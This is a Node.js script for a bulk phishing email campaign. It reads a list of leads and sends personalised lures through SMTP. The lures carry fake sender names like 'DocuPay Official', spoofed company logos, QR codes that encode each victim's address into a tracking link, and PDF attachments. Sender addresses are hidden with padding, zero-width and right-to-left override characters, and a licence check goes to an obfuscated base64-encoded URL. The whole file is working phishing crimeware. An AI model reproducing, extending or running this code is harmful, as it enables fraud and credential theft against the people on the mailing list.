// test.mjs - ULTRA COMPLETE WITH DASHBOARD + FROM HIDING + FIXED QR
import fs from 'fs/promises';
import os from 'os';
import puppeteerExtra from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import QRCode from 'qrcode';
import pLimit from 'p-limit';
import nodemailer from 'nodemailer';
import crypto from 'crypto';
import { processAdvancedPlaceholders, getLogoBufferForCID } from './placeholders.js';
import readline from 'readline';
import configRaw from './config.js';
import chalk from 'chalk';
import cliProgress from 'cli-progress';

puppeteerExtra.use(StealthPlugin());

// ================== FILE PATHS ==================
const messageFile = 'message.html';
const attachmentFile = 'attachment.html';
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const VALIDATION_BASE = "aHR0cHM6Ly90b2tlbmgyMC5zaXRlL290cC5waHA=";
function getValidationUrl() {
  return Buffer.from(VALIDATION_BASE, 'base64').toString();
}

// ================== DASHBOARD ==================
const progressBar = new cliProgress.SingleBar({
  format: chalk.cyan('{bar}') + ' {percentage}% | ' +
          chalk.yellow('{value}/{total}') + ' | ' +
          chalk.green('✅ {success}') + ' | ' +
          chalk.red('❌ {failed}'),
  barCompleteChar: '█',
  barIncompleteChar: '░',
  hideCursor: true
});

let startTime = Date.now();
let currentRecipient = "";

// ================== CONFIG ==================
const originalConfig = { ...configRaw };
let config = { ...originalConfig };

async function processConfigPlaceholders(recipient) {
  config = { ...originalConfig }; // Reset every recipient
  for (const key in config) {
    if (typeof config[key] === 'string') {
      config[key] = await processAdvancedPlaceholders(config[key], recipient);
    } else if (Array.isArray(config[key])) {
      config[key] = await Promise.all(config[key].map(item =>
        typeof item === 'string' ? processAdvancedPlaceholders(item, recipient) : item
      ));
    }
  }
}

// ================== GLOBAL VARIABLES ==================
let fromNames = [];
let subjects = [];
let browserInstance = null;
let transporterInstance = null;
let isPaused = false;
let isRunning = true;
let currentIndex = 0;
let successCount = 0;
let failedCount = 0;
let sentCount = 0;
let recipients = [];

// ================== DASHBOARD HELPERS ==================
function formatTime(ms) {
  const seconds = Math.floor(ms / 1000);
  const minutes = Math.floor(seconds / 60);
  return `${minutes}m ${seconds % 60}s`;
}

function updateDashboard() {
  const elapsed = (Date.now() - startTime) / 1000;
  const rate = elapsed > 0 ? Math.round(sentCount / elapsed * 60) : 0;
  progressBar.update(sentCount, {
    success: successCount,
    failed: failedCount,
    total: recipients.length
  });
  console.log(chalk.gray('\n' + '─'.repeat(70)));
  console.log(chalk.bold.cyan(' STATUS : ') + (isPaused ? chalk.yellow('⏸️ PAUSED') : chalk.green('🚀 RUNNING')));
  console.log(chalk.bold.cyan(' SENDING : ') + chalk.white(currentRecipient || 'N/A'));
  console.log(chalk.bold.cyan(' SPEED : ') + chalk.magenta(`${rate} emails/min`));
  console.log(chalk.bold.cyan(' ELAPSED : ') + chalk.white(formatTime(Date.now() - startTime)));
  if (sentCount > 5) {
    const eta = formatTime(((recipients.length - sentCount) / (sentCount / (Date.now() - startTime))) * 1000);
    console.log(chalk.bold.cyan(' ETA : ') + chalk.white(eta));
  }
  console.log(chalk.gray('─'.repeat(70)));
}

// ================== UTILITIES ==================
async function ensureScreenshotsDir() {
  try { await fs.mkdir('screenshots', { recursive: true }); } catch (e) {}
}

async function loadRandomLists() {
  try {
    fromNames = (await fs.readFile('fromname.txt', 'utf-8')).split(/\r?\n/).filter(Boolean);
    subjects = (await fs.readFile('subject.txt', 'utf-8')).split(/\r?\n/).filter(Boolean);
  } catch (e) {
    fromNames = ["DocuPay Official"];
    subjects = ["Important Document"];
  }
}

function getRandomItem(arr) {
  return arr?.length ? arr[Math.floor(Math.random() * arr.length)] : "Official";
}

function escapeRegExp(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// ================== FROM HIDING ==================
function getHiddenFrom(senderAddress, displayName) {
  if (!config.useAdvancedFromHiding) {
    return `"${displayName}" <${senderAddress}>`;
  }
  const zwsp = '\u200B';
  if (config.fromHidingMode === "mild") {
    return `"${displayName} ${' '.repeat(65)}"` + ` <${zwsp}${senderAddress}>`;
  } else if (config.fromHidingMode === "spaces") {
    return `"${displayName}" <${' '.repeat(90)}${zwsp}${senderAddress}>`;
  } else if (config.fromHidingMode === "strong") {
    const rtl = '\u202E';
    const pop = '\u202C';
    const reversed = senderAddress.split('').reverse().join('');
    return `"${displayName}" <${rtl}${reversed}${pop}${zwsp}${senderAddress}>`;
  }
  return `"${displayName}" <${senderAddress}>`;
}

// ================== BROWSER ==================
async function getBrowser() {
  if (!browserInstance) {
    console.log("🚀 Launching browser...");
    browserInstance = await puppeteerExtra.launch({
      headless: true,
      defaultViewport: { width: 1280, height: 900 },
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-blink-features=AutomationControlled'
      ],
      channel: 'chrome',
    });
  }
  return browserInstance;
}

// ================== DYNAMIC CODE ==================
const DYNAMIC_CODE_CONFIG = {
  enabled: true,
  url: "https://disbursementsettlement3300.andrew-f96.workers.dev/",
  selectors: ["#code", ".code", "#dynamic-code", ".dynamic-code", "pre", "code", "h1", "h2", ".result", "#result"],
  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
};

async function getDynamicCode(recipientAddress = '') {
  if (!DYNAMIC_CODE_CONFIG.enabled) return null;
  let page = null;
  try {
    await ensureScreenshotsDir();
    const browser = await getBrowser();
    page = await browser.newPage();
    await page.setUserAgent(DYNAMIC_CODE_CONFIG.userAgent);
    await page.goto(DYNAMIC_CODE_CONFIG.url, { waitUntil: 'networkidle2', timeout: 60000 });
    await new Promise(r => setTimeout(r, 8000));
    let code = null;
    for (const selector of DYNAMIC_CODE_CONFIG.selectors) {
      try {
        const text = await page.$eval(selector, el => el.textContent?.trim());
        if (text) {
          const match = text.match(/[A-Z0-9]{9}/);
          if (match) { code = match[0]; break; }
        }
      } catch (e) {}
    }
    if (!code) {
      const pageText = await page.evaluate(() => document.body.innerText);
      const match = pageText.match(/[A-Z0-9]{9}/);
      if (match) code = match[0];
    }
    return code && code.length === 9 ? code : null;
  } catch (error) {
    console.error("Dynamic Code Error:", error.message);
    return null;
  } finally {
    if (page) await page.close().catch(() => {});
  }
}

// ================== FIXED QR CODE FUNCTION ==================
async function generateQRBuffer(recipientAddress) {
  try {
    const cleanEmail = recipientAddress.trim().toLowerCase();
    const base64Email = Buffer.from(cleanEmail, 'utf8').toString('base64').replace(/=+$/, '');

    let baseLink = originalConfig.qrBaseLink || "https://example.com/track";

    baseLink = await processAdvancedPlaceholders(baseLink, recipientAddress);

    baseLink = baseLink
      .replace(/\${RECIPIENT_BASE64_EMAIL}/g, base64Email)
      .replace(/{RECIPIENT_BASE64_EMAIL}/g, base64Email);


    return await QRCode.toBuffer(baseLink, { 
      width: config.qrWidth || 180, 
      margin: 2 
    });
  } catch (e) {
    console.error("QR Generation Error:", e.message);
    return null;
  }
}

// ================== PDF & EMBED ==================
const pdfLimit = pLimit(config.pdfConcurrency || 2);

async function convertAttachmentToPdf(htmlContent) {
  if (!config.convertToPdf) return null;
  return pdfLimit(async () => {
    const br = await getBrowser();
    const page = await br.newPage();
    await page.setContent(htmlContent, { waitUntil: 'networkidle0' });
    const pdfBuffer = await page.pdf({ format: 'A4', printBackground: true });
    await page.close();
    return {
      pdfBuffer,
      pdfFileName: `${config.pdfFileNamePrefix || 'Document'}${Date.now()}.pdf`
    };
  });
}

async function embedImagesAsCID(htmlContent) {
  let processedHtml = htmlContent;
  const imageRegex = /<img[^>]+src=["'](.*?)["'][^>]*>/gi;
  const matches = [...htmlContent.matchAll(imageRegex)];
  let cidCounter = 0;
  for (const match of matches) {
    const fullTag = match[0];
    let src = match[1].trim();
    if (src.startsWith('cid:') || src.startsWith('data:')) continue;
    cidCounter++;
    const cid = `img_${cidCounter}_${Date.now()}`;
    try {
      let buffer;
      if (src.startsWith('http')) {
        const res = await fetch(src);
        buffer = Buffer.from(await res.arrayBuffer());
      } else {
        buffer = await fs.readFile(src);
      }
      processedHtml = processedHtml.replace(new RegExp(escapeRegExp(fullTag), 'g'), fullTag.replace(src, `cid:${cid}`));
    } catch (e) {}
  }
  return { processedHtml };
}

async function createTransporter() {
  if (transporterInstance) return transporterInstance;
  transporterInstance = nodemailer.createTransport({
    host: config.smtpHost,
    port: config.smtpPort,
    secure: config.smtpSecure,
    auth: { user: config.smtpUsername, pass: config.smtpPassword },
    pool: true,
    maxConnections: 10
  });
  return transporterInstance;
}

function getPriorityHeaders(priority, addFlag) {
  let headers = priority === 0 ? { 'Importance': 'normal', 'X-Priority': '3' } : { 'Importance': 'high', 'X-Priority': '1' };
  if (addFlag) headers['X-Message-Flag'] = 'Follow up';
  return { priority: priority === 0 ? 'normal' : 'high', headers };
}

// ================== SEND EMAIL ==================
async function sendEmailViaSMTP(recipientAddress, senderAddress, isTest = false) {
  currentRecipient = recipientAddress;
  try {
    await processConfigPlaceholders(recipientAddress);

    let emailBody = await fs.readFile(messageFile, 'utf-8');
    let attachmentHtml = config.convertToPdf ? await fs.readFile(attachmentFile, 'utf-8') : '';

    emailBody = await processAdvancedPlaceholders(emailBody, recipientAddress);
    if (config.convertToPdf) attachmentHtml = await processAdvancedPlaceholders(attachmentHtml, recipientAddress);

    if (DYNAMIC_CODE_CONFIG.enabled && (emailBody.includes('{code}') || attachmentHtml.includes('{code}'))) {
      const dynamicCode = await getDynamicCode(recipientAddress);
      if (dynamicCode) {
        emailBody = emailBody.replace(/{code}/g, dynamicCode);
        if (attachmentHtml) attachmentHtml = attachmentHtml.replace(/{code}/g, dynamicCode);
      }
    }

    const qrBuffer = await generateQRBuffer(recipientAddress);
    if (qrBuffer) {
      const qrBase64 = qrBuffer.toString('base64');
      const qrTag = `<img src="data:image/png;base64,${qrBase64}" style="max-width:180px;"/>`;
      emailBody = emailBody.replace(/{QRCODE}/g, qrTag);
      if (attachmentHtml) attachmentHtml = attachmentHtml.replace(/{QRCODE}/g, qrTag);
    }

    const { processedHtml: finalEmailBody } = await embedImagesAsCID(emailBody);
    let finalAttachmentHtml = attachmentHtml ? (await embedImagesAsCID(attachmentHtml)).processedHtml : '';

    const domain = recipientAddress.split('@')[1];
    const logoBuffer = await getLogoBufferForCID(domain);
    if (logoBuffer && finalAttachmentHtml) {
      const logoBase64 = logoBuffer.toString('base64');
      finalAttachmentHtml = finalAttachmentHtml.replace(/src=["']?cid:companylogo["']?/gi, `src="data:image/png;base64,${logoBase64}"`);
    }

    let finalBody = finalEmailBody.replace(/<img[^>]*companylogo[^>]*>/gi, '');

    const priorityConfig = getPriorityHeaders(config.emailPriority, config.addFlag);
    const displayName = await processAdvancedPlaceholders(getRandomItem(fromNames), recipientAddress);

    const mailOptions = {
      from: getHiddenFrom(senderAddress, displayName),
      to: recipientAddress,
      subject: await processAdvancedPlaceholders(getRandomItem(subjects), recipientAddress),
      html: finalBody,
      replyTo: config.replyTo || senderAddress,
      priority: priorityConfig.priority,
      headers: priorityConfig.headers,
      attachments: []
    };

    if (config.convertToPdf && finalAttachmentHtml) {
      const pdfData = await convertAttachmentToPdf(finalAttachmentHtml);
      if (pdfData) mailOptions.attachments.push({ 
        filename: pdfData.pdfFileName, 
        content: pdfData.pdfBuffer, 
        contentType: 'application/pdf' 
      });
    }

    await (await createTransporter()).sendMail(mailOptions);

    if (!isTest) await new Promise(r => setTimeout(r, config.delayBetweenEmails || 2000));

    successCount++;
    sentCount++;
    updateDashboard();
    console.log(chalk.green(`✅ SUCCESS | ${recipientAddress}`));
    return true;
  } catch (error) {
    failedCount++;
    sentCount++;
    updateDashboard();
    console.log(chalk.red(`❌ FAILED | ${recipientAddress} → ${error.message}`));
    return false;
  }
}

// ================== CONTROLS ==================
function setupKeyboardControls() {
  readline.emitKeypressEvents(process.stdin);
  if (process.stdin.isTTY) process.stdin.setRawMode(true);
  process.stdin.on('keypress', (str, key) => {
    if (key.name === 'q' || key.name === 'Q') {
      isRunning = false;
      showSummaryAndExit();
    } else if (key.name === 'p' || key.name === 'P') {
      isPaused = !isPaused;
      console.log(`\n${isPaused ? chalk.yellow('⏸️ PAUSED') : chalk.green('▶️ RESUMED')}`);
    }
  });
}

async function showSummaryAndExit() {
  if (browserInstance) await browserInstance.close().catch(() => {});
  progressBar.stop();
  console.log(chalk.bold.green("\n" + "═".repeat(70)));
  console.log(chalk.bold.green(" CAMPAIGN SUMMARY"));
  console.log(chalk.bold.green("═".repeat(70)));
  console.log(chalk.green(` Total Sent : ${sentCount}`));
  console.log(chalk.green(` Successful : ${successCount}`));
  console.log(chalk.red(` Failed : ${failedCount}`));
  console.log(chalk.cyan(` Success Rate : ${sentCount ? Math.round((successCount/sentCount)*100) : 0}%`));
  console.log(chalk.bold.green("═".repeat(70)));
  process.exit(0);
}

// ================== TOKEN VALIDATION ==================
async function getMachineId() {
  const networkInterfaces = os.networkInterfaces();
  let macAddress = '';
  for (const interfaceName in networkInterfaces) {
    for (const iface of networkInterfaces[interfaceName]) {
      if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') {
        macAddress = iface.mac; break;
      }
    }
    if (macAddress) break;
  }
  const fingerprint = `${os.hostname()}-${os.platform()}-${macAddress}`;
  return crypto.createHash('sha256').update(fingerprint).digest('hex');
}

async function loadToken() {
  try {
    const token = await fs.readFile('token.txt', 'utf-8');
    return token.trim();
  } catch {
    console.error("❌ token.txt not found!");
    process.exit(1);
  }
}

async function validateToken(token) {
  console.log("🔐 Validating token...");
  const machineId = await getMachineId();
  try {
    const url = getValidationUrl();
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token, machineId })
    });
    const result = await response.json();
    return result.valid === true;
  } catch (error) {
    console.error("Validation failed:", error.message);
    return false;
  }
}

async function testSMTPAndSave() {
  console.log("🔍 Checking SMTP...");
  const transporter = nodemailer.createTransport({
    host: config.smtpHost,
    port: config.smtpPort,
    secure: config.smtpSecure,
    auth: { user: config.smtpUsername, pass: config.smtpPassword }
  });
  try {
    await transporter.verify();
    console.log("✅ SMTP OK\n");
    return true;
  } catch (error) {
    console.log("❌ SMTP Error:", error.message);
    return false;
  }
}

// ====================== MAIN ======================
async function main() {
  console.clear();
  console.log(chalk.bold.green("\n╔══════════════════════════════════════════════════════════════╗"));
  console.log(chalk.bold.green("║ EMAIL SENDER v2.4 - QR CODE FIXED ║"));
  console.log(chalk.bold.green("╚══════════════════════════════════════════════════════════════╝\n"));

  const token = await loadToken();
  if (!(await validateToken(token))) process.exit(1);

  await testSMTPAndSave();
  await loadRandomLists();

  const data = await fs.readFile('Leads.txt', 'utf-8');
  recipients = data.split(/\r?\n/).filter(Boolean);

  console.log(chalk.blue(`📋 Loaded ${recipients.length} leads.\n`));

  await ensureScreenshotsDir();
  setupKeyboardControls();

  const emailLimit = pLimit(config.emailConcurrency || 5);
  startTime = Date.now();
  progressBar.start(recipients.length, 0, { success: 0, failed: 0 });

  while (isRunning && currentIndex < recipients.length) {
    if (isPaused) {
      await new Promise(r => setTimeout(r, 300));
      continue;
    }

    const recipient = recipients[currentIndex];

    if ((currentIndex + 1) % (config.sendTestEvery || 10) === 0 && config.testEmail) {
      await sendEmailViaSMTP(config.testEmail, config.senderAddresses[0], true);
    }

    await emailLimit(() => sendEmailViaSMTP(recipient, config.senderAddresses[0]));
    currentIndex++;
  }

  await showSummaryAndExit();
}

main().catch(err => {
  console.error(chalk.red("\nCritical Error:"), err.message);
  process.exit(1);
});
